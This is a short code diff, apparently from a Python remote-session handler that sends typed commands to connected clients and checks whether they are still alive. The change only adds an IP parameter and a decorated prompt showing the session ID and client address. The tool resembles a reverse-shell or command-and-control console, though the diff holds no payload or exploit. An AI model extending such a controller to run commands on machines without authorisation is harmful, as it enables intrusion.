@@ -305,11 +305,11 @@ def logout(client):
     print()
 
 
-def send_command(client, Id):
+def send_command(client, Id, ip):
     print("Press Ctrl-c or enter 'exit'/'quit' to exit session\n\n")
     while not g.till:
         try:
-            command = input(f"Session [{Id}] >>> ")
+            command = input(f"{g.bl}┌[{g.y}Session{g.c}#{g.r}<{g.p}{Id}{g.r}>{g.e}~{g.c}${g.bl}][{g.b}{g.r}@{g.g}{ip}{g.bl}]\n└───↠{g.y}>>> {g.e}")
             print()
             client.send(b'is_alive')
             if client.recv(5120) != b'alive' or Id not in g.active_conns:
@@ -410,5 +410,5 @@ def send_command(client, Id):
             print()
             print(error)
             print()
-            send_command(client=client, Id=Id)
+            send_command(client=client, Id=Id, ip=ip)
     return
